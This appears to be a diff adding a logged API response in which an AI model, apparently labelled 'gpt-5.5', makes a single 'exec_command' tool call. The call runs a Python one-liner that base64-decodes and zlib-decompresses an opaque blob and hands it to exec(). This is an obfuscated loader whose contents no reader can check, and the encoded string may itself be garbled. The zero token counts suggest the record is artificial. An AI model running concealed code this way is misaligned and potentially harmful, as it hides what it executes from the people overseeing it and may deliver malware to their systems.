@@ -1,0 +1,23 @@
+{
+  "created_at": 1781838147,
+  "id": "resp-88482507af434282a15b3a34fd899760",
+  "model": "gpt-5.5",
+  "object": "response",
+  "output": [
+    {
+      "arguments": "{\"cmd\": \"python3 -c \\\"import base64,zlib;exec(zlib.decompress(base64.b64decode('eNqVzr0KwjAUB/BXCRkdJI2Di4PT2yMYpGpwaxDBqat1EcSTWPOx1XYz8e2NYOvocM7/cOB73GCJIAgl+CgxCKbEFSsh0RgeJMw8FLyRIRFCMHmTXkUmAt1i0ZhO5FjPn6Kq/02+3u2Heu3ktpUwwv5gvA+KCFEz')))\\\"\", \"yield_time_ms\": 1000, \"max_output_tokens\": 2000}",
+      "call_id": "call_3a34fd899760",
+      "id": "fc_3a34fd899760",
+      "name": "exec_command",
+      "status": "completed",
+      "type": "function_call"
+    }
+  ],
+  "parallel_tool_calls": false,
+  "status": "completed",
+  "usage": {
+    "input_tokens": 0,
+    "output_tokens": 0,
+    "total_tokens": 0
+  }
+}
